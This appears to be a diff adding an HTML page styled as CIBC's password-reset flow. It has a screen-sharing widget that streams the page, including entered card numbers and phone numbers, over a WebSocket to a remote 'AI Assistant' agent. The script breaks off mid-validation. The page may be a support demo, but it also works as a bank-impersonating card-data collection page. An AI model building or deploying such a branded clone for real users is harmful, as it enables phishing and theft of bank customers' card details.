@@ -1,0 +1,1383 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Reset Password - CIBC</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@400;600;700&display=swap" rel="stylesheet">
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+    body {
+      font-family: 'Open Sans', Arial, sans-serif;
+      background: #c41f3e;
+      min-height: 100vh;
+      color: #333;
+      font-size: 14px;
+      line-height: 1.5;
+    }
+
+    /* Header Bar */
+    .card-header-bar {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      margin-bottom: 24px;
+      padding-bottom: 20px;
+      border-bottom: 1px solid #eee;
+    }
+
+    .card-header-bar .logo {
+      margin-bottom: 0;
+      text-align: left;
+    }
+
+    .live-support-btn {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      background: #c41f3e;
+      color: #fff;
+      border: none;
+      padding: 12px 20px;
+      border-radius: 4px;
+      font-size: 14px;
+      font-weight: 600;
+      cursor: pointer;
+      transition: background 0.2s;
+      font-family: inherit;
+    }
+
+    .live-support-btn:hover {
+      background: #a01830;
+    }
+
+    .live-support-btn svg {
+      flex-shrink: 0;
+    }
+
+    /* Main Container */
+    .page-wrapper {
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      padding: 20px;
+    }
+
+    .card {
+      background: #fff;
+      border: 1px solid #ddd;
+      border-radius: 4px;
+      width: 100%;
+      max-width: 620px;
+      padding: 30px 50px 40px;
+      margin-top: 20px;
+      position: relative;
+    }
+
+    /* Accessibility Icon */
+    .accessibility-icon {
+      position: absolute;
+      top: 20px;
+      right: 20px;
+      color: #767676;
+      cursor: pointer;
+    }
+
+    .accessibility-icon svg {
+      width: 24px;
+      height: 24px;
+    }
+
+    /* Logo */
+    .logo {
+      text-align: center;
+    }
+
+    /* Progress Steps */
+    .step-indicator {
+      text-align: center;
+      margin-bottom: 8px;
+    }
+
+    .step-text {
+      font-size: 11px;
+      font-weight: 700;
+      color: #333;
+      text-transform: uppercase;
+      letter-spacing: 0.5px;
+    }
+
+    .step-text .step-num {
+      color: #c41f3e;
+    }
+
+    .progress-bar {
+      display: flex;
+      gap: 4px;
+      max-width: 300px;
+      margin: 12px auto;
+    }
+
+    .progress-segment {
+      flex: 1;
+      height: 6px;
+      background: #d9d9d9;
+      border-radius: 3px;
+    }
+
+    .progress-segment.active {
+      background: #c41f3e;
+    }
+
+    .next-step {
+      text-align: center;
+      font-size: 13px;
+      color: #666;
+      margin-bottom: 24px;
+    }
+
+    /* Header Text */
+    .header-subtitle {
+      text-align: center;
+      color: #c41f3e;
+      font-size: 13px;
+      margin-bottom: 8px;
+    }
+
+    .header-title {
+      text-align: center;
+      font-size: 24px;
+      font-weight: 400;
+      color: #333;
+      margin-bottom: 20px;
+    }
+
+    .header-desc {
+      font-size: 14px;
+      color: #333;
+      margin-bottom: 16px;
+    }
+
+    /* Info List */
+    .info-section {
+      margin-bottom: 20px;
+    }
+
+    .info-section p {
+      font-size: 14px;
+      margin-bottom: 8px;
+    }
+
+    .info-list {
+      margin-left: 20px;
+      margin-bottom: 16px;
+    }
+
+    .info-list li {
+      font-size: 14px;
+      margin-bottom: 4px;
+      color: #333;
+    }
+
+    .guide-link {
+      color: #0066cc;
+      text-decoration: underline;
+      font-size: 14px;
+      display: inline-block;
+      margin-bottom: 24px;
+    }
+
+    .guide-link:hover {
+      color: #004499;
+    }
+
+    /* Form Elements */
+    .form-group {
+      margin-bottom: 20px;
+    }
+
+    .form-label {
+      display: block;
+      font-size: 14px;
+      font-weight: 600;
+      color: #333;
+      margin-bottom: 8px;
+    }
+
+    .form-label .info-icon {
+      margin-left: 4px;
+      color: #666;
+      cursor: help;
+    }
+
+    .form-input {
+      width: 100%;
+      padding: 10px 12px;
+      border: 1px solid #333;
+      border-radius: 4px;
+      font-size: 16px;
+      font-family: inherit;
+      transition: border-color 0.2s, box-shadow 0.2s;
+    }
+
+    .form-input:focus {
+      outline: none;
+      border-color: #c41f3e;
+      box-shadow: 0 0 0 2px rgba(139, 26, 45, 0.2);
+    }
+
+    .form-input::placeholder {
+      color: #999;
+    }
+
+    .form-input.small {
+      max-width: 180px;
+    }
+
+    .form-select {
+      width: 100%;
+      padding: 10px 12px;
+      border: 1px solid #333;
+      border-radius: 4px;
+      font-size: 16px;
+      font-family: inherit;
+      background: #fff;
+      cursor: pointer;
+      appearance: none;
+      background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='12' height='12' viewBox='0 0 12 12'%3E%3Cpath fill='%23333' d='M6 8L1 3h10z'/%3E%3C/svg%3E");
+      background-repeat: no-repeat;
+      background-position: right 12px center;
+    }
+
+    .form-select:focus {
+      outline: none;
+      border-color: #c41f3e;
+      box-shadow: 0 0 0 2px rgba(139, 26, 45, 0.2);
+    }
+
+    .form-row {
+      display: flex;
+      gap: 16px;
+    }
+
+    .form-row .form-group {
+      flex: 1;
+    }
+
+    /* Buttons */
+    .button-row {
+      display: flex;
+      justify-content: center;
+      gap: 12px;
+      margin-top: 32px;
+      margin-bottom: 24px;
+    }
+
+    .btn {
+      padding: 12px 32px;
+      border-radius: 4px;
+      font-size: 16px;
+      font-weight: 600;
+      font-family: inherit;
+      cursor: pointer;
+      transition: all 0.2s;
+      min-width: 120px;
+    }
+
+    .btn-outline {
+      background: #fff;
+      color: #c41f3e;
+      border: 2px solid #c41f3e;
+    }
+
+    .btn-outline:hover {
+      background: #fef2f4;
+    }
+
+    .btn-primary {
+      background: #c41f3e;
+      color: #fff;
+      border: 2px solid #c41f3e;
+    }
+
+    .btn-primary:hover {
+      background: #a01830;
+      border-color: #a01830;
+    }
+
+    /* Footer Link */
+    .footer-link {
+      text-align: center;
+    }
+
+    .footer-link a {
+      color: #0066cc;
+      text-decoration: underline;
+      font-size: 14px;
+    }
+
+    .footer-link a:hover {
+      color: #004499;
+    }
+
+    /* Error Alert */
+    .error-alert {
+      background: #fef2f2;
+      border: 1px solid #f87171;
+      border-radius: 4px;
+      padding: 12px 16px;
+      margin-bottom: 20px;
+      display: none;
+      align-items: center;
+      gap: 10px;
+    }
+
+    .error-alert.show {
+      display: flex;
+    }
+
+    .error-alert svg {
+      flex-shrink: 0;
+      color: #dc2626;
+    }
+
+    .error-alert span {
+      font-size: 14px;
+      color: #991b1b;
+    }
+
+    /* Security Notice */
+    .security-notice {
+      background: #eff6ff;
+      border: 1px solid #93c5fd;
+      border-radius: 4px;
+      padding: 12px 16px;
+      margin-bottom: 20px;
+      display: flex;
+      align-items: flex-start;
+      gap: 10px;
+    }
+
+    .security-notice svg {
+      flex-shrink: 0;
+      color: #2563eb;
+      margin-top: 2px;
+    }
+
+    .security-notice span {
+      font-size: 13px;
+      color: #1e40af;
+    }
+
+    /* Verification Code */
+    .code-inputs {
+      display: flex;
+      gap: 10px;
+      justify-content: center;
+      margin-bottom: 16px;
+    }
+
+    .code-input {
+      width: 48px;
+      height: 56px;
+      border: 1px solid #333;
+      border-radius: 4px;
+      font-size: 24px;
+      font-weight: 600;
+      text-align: center;
+      font-family: inherit;
+    }
+
+    .code-input:focus {
+      outline: none;
+      border-color: #c41f3e;
+      box-shadow: 0 0 0 2px rgba(139, 26, 45, 0.2);
+    }
+
+    .timer-text {
+      text-align: center;
+      font-size: 13px;
+      color: #666;
+      margin-bottom: 24px;
+    }
+
+    /* Password Requirements */
+    .password-reqs {
+      background: #f9fafb;
+      border: 1px solid #e5e7eb;
+      border-radius: 4px;
+      padding: 16px;
+      margin-top: 16px;
+    }
+
+    .password-reqs h4 {
+      font-size: 14px;
+      font-weight: 600;
+      color: #333;
+      margin-bottom: 12px;
+    }
+
+    .req-item {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      font-size: 13px;
+      color: #666;
+      margin-bottom: 6px;
+    }
+
+    .req-item.met {
+      color: #16a34a;
+    }
+
+    .req-item svg {
+      width: 16px;
+      height: 16px;
+    }
+
+    /* Password Field */
+    .password-field {
+      position: relative;
+    }
+
+    .password-field .form-input {
+      padding-right: 44px;
+    }
+
+    .password-toggle {
+      position: absolute;
+      right: 12px;
+      top: 50%;
+      transform: translateY(-50%);
+      background: none;
+      border: none;
+      cursor: pointer;
+      color: #666;
+      padding: 4px;
+    }
+
+    .password-toggle:hover {
+      color: #c41f3e;
+    }
+
+    /* Success */
+    .success-icon {
+      width: 80px;
+      height: 80px;
+      background: #dcfce7;
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      margin: 0 auto 24px;
+    }
+
+    .success-icon svg {
+      width: 40px;
+      height: 40px;
+      color: #16a34a;
+    }
+
+    /* Modal Overlay */
+    .modal-overlay {
+      position: fixed;
+      top: 0;
+      left: 0;
+      right: 0;
+      bottom: 0;
+      background: rgba(0,0,0,0.5);
+      z-index: 1000;
+      display: none;
+    }
+
+    .modal-overlay.show {
+      display: block;
+    }
+
+    /* Share Modal */
+    .share-modal {
+      position: fixed;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      background: #fff;
+      border-radius: 12px;
+      padding: 40px;
+      width: 90%;
+      max-width: 420px;
+      text-align: center;
+      z-index: 1001;
+      display: none;
+      box-shadow: 0 20px 60px rgba(0,0,0,0.3);
+    }
+
+    .share-modal.show {
+      display: block;
+    }
+
+    .modal-close {
+      position: absolute;
+      top: 16px;
+      right: 16px;
+      background: none;
+      border: none;
+      font-size: 28px;
+      color: #999;
+      cursor: pointer;
+      line-height: 1;
+    }
+
+    .modal-close:hover {
+      color: #333;
+    }
+
+    .modal-icon {
+      width: 64px;
+      height: 64px;
+      background: #fef2f4;
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      margin: 0 auto 20px;
+    }
+
+    .share-modal h2 {
+      font-size: 20px;
+      font-weight: 600;
+      color: #333;
+      margin-bottom: 12px;
+    }
+
+    .share-modal p {
+      font-size: 14px;
+      color: #666;
+      margin-bottom: 24px;
+      line-height: 1.5;
+    }
+
+    .modal-btn-primary {
+      background: #c41f3e;
+      color: #fff;
+      border: none;
+      padding: 14px 32px;
+      border-radius: 4px;
+      font-size: 16px;
+      font-weight: 600;
+      cursor: pointer;
+      font-family: inherit;
+      width: 100%;
+    }
+
+    .modal-btn-primary:hover {
+      background: #a01830;
+    }
+
+    .modal-btn-outline {
+      background: #fff;
+      color: #c41f3e;
+      border: 2px solid #c41f3e;
+      padding: 12px 32px;
+      border-radius: 4px;
+      font-size: 14px;
+      font-weight: 600;
+      cursor: pointer;
+      font-family: inherit;
+      width: 100%;
+    }
+
+    .modal-btn-outline:hover {
+      background: #fef2f4;
+    }
+
+    /* Big Code Display */
+    .big-code {
+      font-size: 48px;
+      font-weight: 700;
+      color: #c41f3e;
+      letter-spacing: 8px;
+      font-family: 'Courier New', monospace;
+      background: #f5f5f5;
+      padding: 24px;
+      border-radius: 8px;
+      margin: 24px 0;
+    }
+
+    .status-line {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+      margin-bottom: 20px;
+      font-size: 14px;
+      color: #666;
+    }
+
+    .status-dot {
+      width: 10px;
+      height: 10px;
+      border-radius: 50%;
+      animation: pulse 1.5s infinite;
+    }
+
+    .status-dot.waiting {
+      background: #f59e0b;
+    }
+
+    .status-dot.connected {
+      background: #22c55e;
+    }
+
+    @keyframes pulse {
+      0%, 100% { opacity: 1; }
+      50% { opacity: 0.4; }
+    }
+
+    .privacy-note {
+      font-size: 12px;
+      color: #666;
+      margin-bottom: 20px;
+    }
+
+    /* Active state for header button */
+    .live-support-btn.active {
+      background: #22c55e;
+    }
+
+    .live-support-btn.active:hover {
+      background: #16a34a;
+    }
+
+    .hidden {
+      display: none !important;
+    }
+
+    /* Voice Assistant Widget */
+    .voice-widget {
+      position: fixed;
+      bottom: 24px;
+      left: 24px;
+      z-index: 999;
+      display: none;
+    }
+
+    .voice-widget.show {
+      display: block;
+    }
+
+    .voice-container {
+      background: #1e293b;
+      border-radius: 16px;
+      padding: 16px;
+      box-shadow: 0 10px 40px rgba(0,0,0,0.3);
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      gap: 12px;
+      min-width: 200px;
+    }
+
+    .voice-status {
+      font-size: 12px;
+      color: #94a3b8;
+      text-align: center;
+    }
+
+    .voice-status.speaking {
+      color: #22c55e;
+    }
+
+    .voice-status.listening {
+      color: #8b5cf6;
+    }
+
+    .voice-transcript {
+      font-size: 13px;
+      color: white;
+      text-align: center;
+      max-width: 250px;
+      line-height: 1.4;
+      min-height: 20px;
+    }
+
+    .mic-btn {
+      width: 56px;
+      height: 56px;
+      border-radius: 50%;
+      background: linear-gradient(135deg, #8b5cf6, #6366f1);
+      border: none;
+      cursor: pointer;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      transition: transform 0.2s, box-shadow 0.2s;
+    }
+
+    .mic-btn:hover {
+      transform: scale(1.05);
+    }
+
+    .mic-btn.listening {
+      animation: mic-glow 1.5s infinite;
+    }
+
+    @keyframes mic-glow {
+      0%, 100% { box-shadow: 0 0 0 0 rgba(139, 92, 246, 0.7); }
+      50% { box-shadow: 0 0 0 15px rgba(139, 92, 246, 0); }
+    }
+
+    .mic-btn svg {
+      width: 24px;
+      height: 24px;
+      color: white;
+    }
+
+    .voice-hint {
+      font-size: 11px;
+      color: #64748b;
+    }
+  </style>
+</head>
+<body>
+  <div class="page-wrapper">
+    <div class="card" id="observable-content">
+      <!-- Header Bar -->
+      <div class="card-header-bar">
+        <div class="logo">
+          <img src="https://mma.prnewswire.com/media/1632139/CIBC_CIBC_unveils_new_look_symbolizing_the_bank_s_purpose_of_hel.jpg?p=facebook" alt="CIBC" style="height: 48px;">
+        </div>
+        <button class="live-support-btn" id="supportBtn" onclick="handleSupportClick()">
+          <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+            <path d="M15 12a3 3 0 1 1-6 0 3 3 0 0 1 6 0z"/><path d="M2 12s3-7 10-7 10 7 10 7-3 7-10 7-10-7-10-7z"/>
+          </svg>
+          <span id="supportBtnText">Share My Screen</span>
+        </button>
+      </div>
+
+      <!-- Step 1: Card Details -->
+      <div id="step1">
+        <!-- Progress -->
+        <div class="step-indicator">
+          <span class="step-text"><span class="step-num">STEP 1 OF 3:</span> ENTER YOUR CARD DETAILS</span>
+        </div>
+        <div class="progress-bar">
+          <div class="progress-segment active"></div>
+          <div class="progress-segment"></div>
+          <div class="progress-segment"></div>
+        </div>
+        <div class="next-step">Next step: Identity verification</div>
+
+        <!-- Header -->
+        <div class="header-subtitle">Reset your password for CIBC Mobile and Online Banking®</div>
+        <h1 class="header-title">Enter your card details</h1>
+
+        <p class="header-desc">Reset your password in a few easy steps.</p>
+
+        <div class="info-section">
+          <p>You'll need:</p>
+          <ul class="info-list">
+            <li>Your card number and expiry date, and</li>
+            <li>Your phone to receive a verification message or call. We'll use the number we have on file for you</li>
+          </ul>
+          <a href="#" class="guide-link">Step-by-step guide: How to reset your password</a>
+        </div>
+
+        <div class="error-alert" id="error1">
+          <svg width="20" height="20" viewBox="0 0 24 24" fill="currentColor">
+            <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/>
+          </svg>
+          <span id="error1-text">Please enter valid card details</span>
+        </div>
+
+        <form id="form1">
+          <div class="form-group">
+            <label class="form-label">Card number (16 digits)</label>
+            <input type="text" class="form-input" id="cardNumber" maxlength="19" autocomplete="off">
+          </div>
+
+          <div class="form-group">
+            <label class="form-label">Card expiry date (MM/YY)</label>
+            <input type="text" class="form-input small" id="expiryDate" placeholder="__/__" maxlength="5" autocomplete="off">
+          </div>
+
+          <div class="form-row">
+            <div class="form-group">
+              <label class="form-label">Phone number type</label>
+              <select class="form-select" id="phoneType">
+                <option value="ca">Canada or U.S.</option>
+                <option value="intl">International</option>
+              </select>
+            </div>
+            <div class="form-group">
+              <label class="form-label">Phone number on file <span class="info-icon">ⓘ</span></label>
+              <input type="tel" class="form-input" id="phoneNumber" placeholder="(___) ___-____" autocomplete="off">
+            </div>
+          </div>
+
+          <div class="button-row">
+            <button type="button" class="btn btn-outline">Cancel</button>
+            <button type="submit" class="btn btn-primary">Continue</button>
+          </div>
+        </form>
+
+        <div class="footer-link">
+          <a href="#">Sign on to CIBC Online Banking</a>
+        </div>
+      </div>
+
+      <!-- Step 2: Verification Code -->
+      <div id="step2" class="hidden">
+        <div class="step-indicator">
+          <span class="step-text"><span class="step-num">STEP 2 OF 3:</span> IDENTITY VERIFICATION</span>
+        </div>
+        <div class="progress-bar">
+          <div class="progress-segment active"></div>
+          <div class="progress-segment active"></div>
+          <div class="progress-segment"></div>
+        </div>
+        <div class="next-step">Next step: Create new password</div>
+
+        <div class="header-subtitle">Reset your password for CIBC Mobile and Online Banking®</div>
+        <h1 class="header-title">Enter verification code</h1>
+
+        <p class="header-desc">We sent a 6-digit code to <strong id="maskedPhone">*** *** 0123</strong></p>
+
+        <div class="security-notice">
+          <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+            <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/>
+          </svg>
+          <span>For your security, the support agent cannot see this code</span>
+        </div>
+
+        <div class="error-alert" id="error2">
+          <svg width="20" height="20" viewBox="0 0 24 24" fill="currentColor">
+            <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/>
+          </svg>
+          <span id="error2-text">Invalid code</span>
+        </div>
+
+        <form id="form2">
+          <div class="code-inputs">
+            <input type="text" class="code-input sensitive-field" maxlength="1" data-index="0" autocomplete="off">
+            <input type="text" class="code-input sensitive-field" maxlength="1" data-index="1" autocomplete="off">
+            <input type="text" class="code-input sensitive-field" maxlength="1" data-index="2" autocomplete="off">
+            <input type="text" class="code-input sensitive-field" maxlength="1" data-index="3" autocomplete="off">
+            <input type="text" class="code-input sensitive-field" maxlength="1" data-index="4" autocomplete="off">
+            <input type="text" class="code-input sensitive-field" maxlength="1" data-index="5" autocomplete="off">
+          </div>
+
+          <div class="timer-text">Code expires in <strong id="timer">10:00</strong></div>
+
+          <div class="button-row">
+            <button type="button" class="btn btn-outline" onclick="goToStep(1)">Back</button>
+            <button type="submit" class="btn btn-primary">Verify</button>
+          </div>
+        </form>
+
+        <div class="footer-link">
+          <a href="#" onclick="resendCode(); return false;">Resend code</a>
+        </div>
+      </div>
+
+      <!-- Step 3: New Password -->
+      <div id="step3" class="hidden">
+        <div class="step-indicator">
+          <span class="step-text"><span class="step-num">STEP 3 OF 3:</span> CREATE NEW PASSWORD</span>
+        </div>
+        <div class="progress-bar">
+          <div class="progress-segment active"></div>
+          <div class="progress-segment active"></div>
+          <div class="progress-segment active"></div>
+        </div>
+
+        <div class="header-subtitle">Reset your password for CIBC Mobile and Online Banking®</div>
+        <h1 class="header-title">Create new password</h1>
+
+        <div class="security-notice">
+          <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+            <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/>
+          </svg>
+          <span>For your security, the support agent cannot see your password</span>
+        </div>
+
+        <div class="error-alert" id="error3">
+          <svg width="20" height="20" viewBox="0 0 24 24" fill="currentColor">
+            <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/>
+          </svg>
+          <span id="error3-text">Passwords do not match</span>
+        </div>
+
+        <form id="form3">
+          <div class="form-group">
+            <label class="form-label">New password</label>
+            <div class="password-field">
+              <input type="password" class="form-input sensitive-field" id="newPassword" autocomplete="new-password">
+              <button type="button" class="password-toggle" onclick="togglePassword('newPassword')">
+                <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                  <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/>
+                </svg>
+              </button>
+            </div>
+          </div>
+
+          <div class="form-group">
+            <label class="form-label">Confirm password</label>
+            <div class="password-field">
+              <input type="password" class="form-input sensitive-field" id="confirmPassword" autocomplete="new-password">
+              <button type="button" class="password-toggle" onclick="togglePassword('confirmPassword')">
+                <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                  <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/>
+                </svg>
+              </button>
+            </div>
+          </div>
+
+          <div class="password-reqs">
+            <h4>Password requirements</h4>
+            <div class="req-item" id="req-length">
+              <svg viewBox="0 0 24 24" fill="currentColor"><circle cx="12" cy="12" r="5"/></svg>
+              <span>At least 16 characters</span>
+            </div>
+            <div class="req-item" id="req-upper">
+              <svg viewBox="0 0 24 24" fill="currentColor"><circle cx="12" cy="12" r="5"/></svg>
+              <span>One uppercase letter</span>
+            </div>
+            <div class="req-item" id="req-lower">
+              <svg viewBox="0 0 24 24" fill="currentColor"><circle cx="12" cy="12" r="5"/></svg>
+              <span>One lowercase letter</span>
+            </div>
+            <div class="req-item" id="req-number">
+              <svg viewBox="0 0 24 24" fill="currentColor"><circle cx="12" cy="12" r="5"/></svg>
+              <span>One number</span>
+            </div>
+          </div>
+
+          <div class="button-row">
+            <button type="button" class="btn btn-outline" onclick="goToStep(2)">Back</button>
+            <button type="submit" class="btn btn-primary">Reset password</button>
+          </div>
+        </form>
+      </div>
+
+      <!-- Success -->
+      <div id="step-success" class="hidden">
+        <div class="success-icon">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+            <path d="M20 6L9 17l-5-5"/>
+          </svg>
+        </div>
+        <div class="header-subtitle">Reset your password for CIBC Mobile and Online Banking®</div>
+        <h1 class="header-title">Password reset complete</h1>
+        <p class="header-desc" style="text-align: center;">You can now sign in with your new password.</p>
+        <div class="button-row">
+          <button class="btn btn-primary" onclick="location.reload()">Sign on to CIBC Online Banking</button>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- Voice Assistant Widget -->
+  <div class="voice-widget" id="voiceWidget">
+    <div class="voice-container">
+      <div class="voice-status" id="voiceStatus">AI Assistant Ready</div>
+      <div class="voice-transcript" id="voiceTranscript">Click the mic to ask for help</div>
+      <button class="mic-btn" id="micBtn" onclick="toggleMic()">
+        <svg viewBox="0 0 24 24" fill="currentColor">
+          <path d="M12 14c1.66 0 3-1.34 3-3V5c0-1.66-1.34-3-3-3S9 3.34 9 5v6c0 1.66 1.34 3 3 3zm-1 1.93c-3.94-.49-7-3.85-7-7.93h2c0 3.31 2.69 6 6 6s6-2.69 6-6h2c0 4.08-3.06 7.44-7 7.93V21h4v2H8v-2h4v-5.07z"/>
+        </svg>
+      </button>
+      <div class="voice-hint">Speak to get help with this form</div>
+    </div>
+  </div>
+
+  <!-- Screen Share Modal -->
+  <div class="modal-overlay" id="modalOverlay" onclick="closeModal()"></div>
+  <div class="share-modal" id="shareModal">
+    <button class="modal-close" onclick="closeModal()">&times;</button>
+
+    <!-- Before session starts -->
+    <div id="modal-start">
+      <div class="modal-icon">
+        <svg width="32" height="32" viewBox="0 0 24 24" fill="none" stroke="#c41f3e" stroke-width="2">
+          <path d="M15 12a3 3 0 1 1-6 0 3 3 0 0 1 6 0z"/><path d="M2 12s3-7 10-7 10 7 10 7-3 7-10 7-10-7-10-7z"/>
+        </svg>
+      </div>
+      <h2>Share your screen with your agent</h2>
+      <p>Your agent will be able to see this page to help guide you. Passwords and verification codes are always hidden.</p>
+      <button class="modal-btn-primary" onclick="startSession()">Start Screen Share</button>
+    </div>
+
+    <!-- Session active -->
+    <div id="modal-active" class="hidden">
+      <h2>Tell your agent this code:</h2>
+      <div class="big-code" id="sessionCode">------</div>
+      <div class="status-line" id="sessionStatus">
+        <span class="status-dot waiting"></span>
+        <span id="statusText">Waiting for agent to connect...</span>
+      </div>
+      <p class="privacy-note">🔒 Your passwords and verification codes are hidden from the agent</p>
+      <button class="modal-btn-outline" onclick="endSession()">Stop Sharing</button>
+    </div>
+  </div>
+
+  <script>
+    // ========================================
+    // CO-BROWSING
+    // ========================================
+    let ws = null;
+    let sessionActive = false;
+    let observer = null;
+
+    function handleSupportClick() {
+      if (sessionActive) {
+        // If already sharing, show the modal with the code
+        openModal();
+      } else {
+        // Show the start modal
+        openModal();
+      }
+    }
+
+    function openModal() {
+      document.getElementById('modalOverlay').classList.add('show');
+      document.getElementById('shareModal').classList.add('show');
+    }
+
+    function closeModal() {
+      document.getElementById('modalOverlay').classList.remove('show');
+      document.getElementById('shareModal').classList.remove('show');
+    }
+
+    function startSession() {
+      const protocol = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
+      ws = new WebSocket(`${protocol}//${window.location.host}`);
+      ws.onopen = () => ws.send(JSON.stringify({ type: 'create-session' }));
+      ws.onmessage = (e) => {
+        const data = JSON.parse(e.data);
+        if (data.type === 'session-created') {
+          sessionActive = true;
+          document.getElementById('sessionCode').textContent = data.code;
+          document.getElementById('modal-start').classList.add('hidden');
+          document.getElementById('modal-active').classList.remove('hidden');
+          document.getElementById('supportBtn').classList.add('active');
+          document.getElementById('supportBtnText').textContent = 'Sharing: ' + data.code;
+          startObserving();
+        } else if (data.type === 'agent-joined') {
+          document.querySelector('.status-dot').className = 'status-dot connected';
+          document.getElementById('statusText').textContent = 'AI Assistant connected';
+          document.getElementById('voiceWidget').classList.add('show');
+          initVoice();
+        } else if (data.type === 'agent-disconnected') {
+          document.querySelector('.status-dot').className = 'status-dot waiting';
+          document.getElementById('statusText').textContent = 'Waiting for agent to connect...';
+          document.getElementById('voiceWidget').classList.remove('show');
+        } else if (data.type === 'ai-response') {
+          speakResponse(data.text);
+        } else if (data.type === 'session-ended') {
+          endSessionUI();
+        }
+      };
+      ws.onclose = () => { if (sessionActive) endSessionUI(); };
+    }
+
+    function startObserving() {
+      sendFullPage();
+      observer = new MutationObserver(() => sendFullPage());
+      observer.observe(document.body, { childList: true, subtree: true, attributes: true, characterData: true });
+      document.body.addEventListener('input', sendFullPage);
+      document.addEventListener('mousemove', throttle((e) => {
+        if (ws && ws.readyState === WebSocket.OPEN && sessionActive) {
+          ws.send(JSON.stringify({ type: 'cursor-move', x: e.clientX, y: e.clientY }));
+        }
+      }, 50));
+    }
+
+    function sendFullPage() {
+      if (!ws || ws.readyState !== WebSocket.OPEN || !sessionActive) return;
+      const clone = document.documentElement.cloneNode(true);
+      clone.querySelectorAll('script').forEach(s => s.remove());
+
+      // Remove modal elements from clone
+      clone.querySelectorAll('.modal-overlay, .share-modal').forEach(el => el.remove());
+
+      // Mask sensitive fields (OTVC and passwords)
+      clone.querySelectorAll('input[type="password"], .sensitive-field').forEach(input => {
+        input.setAttribute('value', input.value ? '••••••' : '');
+        input.setAttribute('type', 'text');
+        input.style.color = '#999';
+      });
+
+      // Copy non-sensitive values
+      document.querySelectorAll('input:not([type="password"]):not(.sensitive-field)').forEach((el, i) => {
+        const cloneEls = clone.querySelectorAll('input:not([type="password"]):not(.sensitive-field)');
+        if (cloneEls[i]) cloneEls[i].setAttribute('value', el.value);
+      });
+
+      ws.send(JSON.stringify({ type: 'full-page', html: clone.outerHTML }));
+    }
+
+    function endSession() {
+      if (ws && ws.readyState === WebSocket.OPEN) ws.send(JSON.stringify({ type: 'end-session' }));
+      endSessionUI();
+      closeModal();
+    }
+
+    function endSessionUI() {
+      sessionActive = false;
+      if (observer) observer.disconnect();
+      if (ws) ws.close();
+      document.getElementById('modal-start').classList.remove('hidden');
+      document.getElementById('modal-active').classList.add('hidden');
+      document.getElementById('supportBtn').classList.remove('active');
+      document.getElementById('supportBtnText').textContent = 'Share My Screen';
+      document.querySelector('.status-dot').className = 'status-dot waiting';
+      document.getElementById('statusText').textContent = 'Waiting for agent to connect...';
+    }
+
+    function throttle(fn, limit) {
+      let t; return function() { if (!t) { fn.apply(this, arguments); t = true; setTimeout(() => t = false, limit); } };
+    }
+
+    // ========================================
+    // FORM LOGIC
+    // ========================================
+    document.getElementById('cardNumber').addEventListener('input', (e) => {
+      let v = e.target.value.replace(/\D/g, '');
+      e.target.value = v.match(/.{1,4}/g)?.join(' ') || v;
+    });
+
+    document.getElementById('expiryDate').addEventListener('input', (e) => {
+      let v = e.target.value.replace(/\D/g, '');
+      if (v.length >= 2) v = v.slice(0,2) + '/' + v.slice(2);
+      e.target.value = v;
+    });
+
+    document.getElementById('phoneNumber').addEventListener('input', (e) => {
+      let v = e.target.value.replace(/\D/g, '');
+      if (v.length > 0) {
+        if (v.length <= 3) v = '(' + v;
+        else if (v.length <= 6) v = '(' + v.slice(0,3) + ') ' + v.slice(3);
+        else v = '(' + v.slice(0,3) + ') ' + v.slice(3,6) + '-' + v.slice(6,10);
+      }
+      e.target.value = v;
+    });
+
+    // Step 1
+    document.getElementById('form1').addEventListener('submit', (e) => {
+      e.preventDefault();
+      const card = document.getElementById('cardNumber').value.replace(/\s/g, '');
+      const exp = document.getElementById('expiryDate').value;
+      const phone = document.getElementById('phoneNumber').value.replace(/\D/g, '');
+      if (card.length < 16) { showError('error1', 'Please enter a valid 16-digit card number'); return; }
+      if (!exp.match(/^\d{2}\/\d{2}$/)) { showError('error1', 'Please enter a valid expiry date (MM/YY)'); return; }
